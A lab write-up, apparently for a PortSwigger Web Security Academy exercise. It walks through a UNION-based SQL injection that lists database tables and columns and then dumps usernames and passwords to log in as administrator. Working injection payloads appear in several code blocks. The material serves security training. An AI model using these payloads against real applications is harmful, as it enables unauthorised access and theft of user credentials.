# 1. SQL injection attack, listing the database contents on non-Oracle databases

- **Question** :  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.To solve the lab, log in as the `administrator` user.

Ans :

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:

```sql
'+UNION+SELECT+'abc','def'--
```

1. Use the following payload to retrieve the list of tables in the database:

```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

1. Find the name of the table containing user credentials.
2. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:'

```sql
+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

1. Find the names of the columns containing usernames and passwords.
2. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

```sql
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```

1. Find the password for the `administrator` user, and use it to log in.